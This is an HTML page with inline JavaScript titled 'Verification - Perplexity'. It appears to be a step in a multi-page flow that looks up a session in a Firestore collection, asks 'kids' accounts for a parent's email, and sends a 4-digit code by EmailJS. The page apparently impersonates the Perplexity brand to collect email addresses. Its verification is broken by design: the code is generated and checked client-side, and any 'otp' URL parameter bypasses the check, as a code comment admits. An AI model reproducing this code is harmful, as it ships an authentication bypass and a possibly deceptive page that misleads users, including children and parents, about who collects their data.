<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification - Perplexity</title>
    <!-- EmailJS SDK -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        :root { --primary: #202124; --bg: #ffffff; --text: #1a1a1b; --gray: #70757a; }
        body { font-family: 'Times New Roman', Times, serif; background-color: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; height: 100vh; }
        .container { width: 90%; max-width: 400px; text-align: center; margin-top: 80px; position: relative; }
        
        /* Icon Styling from Image */
        .icon-wrapper { position: relative; width: 100px; height: 100px; margin: 0 auto 30px; border: 1.5px solid #e0e0e0; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .icon-wrapper::after { content: ''; position: absolute; width: 80px; height: 80px; border: 1px solid #e0e0e0; border-radius: 50%; }
        .paper-plane { width: 35px; fill: #444; transform: rotate(-10deg); }

        h1 { font-size: 32px; font-weight: 500; margin: 0 0 15px 0; letter-spacing: -0.5px; }
        .subtext { font-family: sans-serif; font-size: 15px; color: var(--gray); line-height: 1.5; margin-bottom: 40px; }
        .email-display { color: #1a1a1b; font-weight: 500; }

        /* Input Styling */
        .input-group { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 30px; }
        .otp-input { width: 100%; height: 75px; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 28px; text-align: center; font-family: sans-serif; outline: none; transition: border-color 0.2s; }
        .otp-input:focus { border-color: #000; }
        
        .parent-email-input { width: 100%; padding: 18px; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; }

        button { width: 100%; padding: 18px; background: #b4b4b4; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        button.active { background: #202124; cursor: pointer; }
        
        .hidden { display: none; }
        #loading { margin-top: 50px; font-family: sans-serif; color: var(--gray); }
    </style>
</head>
<body>

<div class="container">
    <div id="loader">Checking account status...</div>

    <!-- STEP 1: ASK FOR PARENT EMAIL (Only for Kids) -->
    <div id="email-step" class="hidden">
        <div class="icon-wrapper">
            <svg class="paper-plane" viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
        </div>
        <h1>Parental Approval</h1>
        <p class="subtext">This is a kids account. Please enter a parent's email to continue.</p>
        <input type="email" id="parentEmail" class="parent-email-input" placeholder="Enter parent's email">
        <button id="sendBtn" class="active">Send Link</button>
    </div>

    <!-- STEP 2: ENTER OTP (The screen from your image) -->
    <div id="otp-step" class="hidden">
        <div class="icon-wrapper">
            <svg class="paper-plane" viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
        </div>
        <h1>Check your email</h1>
        <p class="subtext">A temporary sign-in link has been sent to <br><span class="email-display" id="displayEmail"></span></p>
        
        <div class="input-group">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
        </div>
        <button id="confirmBtn">Confirm</button>
    </div>
</div>

<script type="module">
    // --- FIREBASE SETUP ---
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        // !! PASTE YOUR FIREBASE CONFIG OBJECT HERE !!
        projectId: "question-metabase",
        // apiKey: "...", etc.
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // --- EMAILJS SETUP ---
    emailjs.init("Yr9MutUoHOEONnFgn");

    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');
    const urlOtp = urlParams.get('otp');

    let correctOtp = "";
    let guardianEmail = "";

    async function checkAccount() {
        if (!sessionId) return;

        const docRef = doc(db, "ASPX Keys", sessionId);
        const docSnap = await getDoc(docRef);

        if (docSnap.exists()) {
            const data = docSnap.data();

            // Condition 1: Direct Redirect
            if (data.family === "no" || data.family === "busniess") {
                window.location.href = "6.html";
                return;
            }

            // Condition 2: Check for Magic Link Auto-Verify
            if (urlOtp) {
                // Usually you'd check if urlOtp matches a code in DB, 
                // but since we generate it fresh, we process if params exist
                await updateAndRedirect(data.email); 
                return;
            }

            // Condition 3: Kids Account Logic
            if (data.type === "kids" || data.family === "commit") {
                document.getElementById('loader').classList.add('hidden');
                document.getElementById('email-step').classList.remove('hidden');
            }
        }
    }

    // Send Email Logic
    document.getElementById('sendBtn').onclick = async () => {
        guardianEmail = document.getElementById('parentEmail').value;
        if (!guardianEmail.includes('@')) return alert("Valid email required");

        correctOtp = Math.floor(1000 + Math.random() * 9000).toString();
        
        const params = {
            email: guardianEmail,
            otp: correctOtp,
            session: sessionId
        };

        try {
            await emailjs.send('service_1ij08zn', 'template_qxz1wka', params);
            document.getElementById('displayEmail').innerText = guardianEmail;
            document.getElementById('email-step').classList.add('hidden');
            document.getElementById('otp-step').classList.remove('hidden');
        } catch (err) {
            alert("Email failed to send. Check EmailJS settings.");
        }
    };

    // OTP Verification Logic
    document.getElementById('confirmBtn').onclick = async () => {
        const inputs = document.querySelectorAll('.otp-input');
        let entered = "";
        inputs.forEach(i => entered += i.value);

        if (entered === correctOtp) {
            await updateAndRedirect(guardianEmail);
        } else {
            alert("Incorrect code");
        }
    };

    async function updateAndRedirect(emailToSave) {
        const docRef = doc(db, "ASPX Keys", sessionId);
        await updateDoc(docRef, {
            family: "commited",
            guardians: emailToSave,
            updatedAt: new Date().toISOString()
        });
        window.location.href = "6.html";
    }

    // UI Helper: Auto-focus next box
    window.moveToNext = (el, index) => {
        const inputs = document.querySelectorAll('.otp-input');
        if (el.value.length === 1 && index < 3) {
            inputs[index + 1].focus();
        }
        
        // Activate button if all 4 boxes filled
        let full = true;
        inputs.forEach(i => { if(!i.value) full = false; });
        if(full) document.getElementById('confirmBtn').classList.add('active');
    };

    checkAccount();
</script>
</body>
</html>
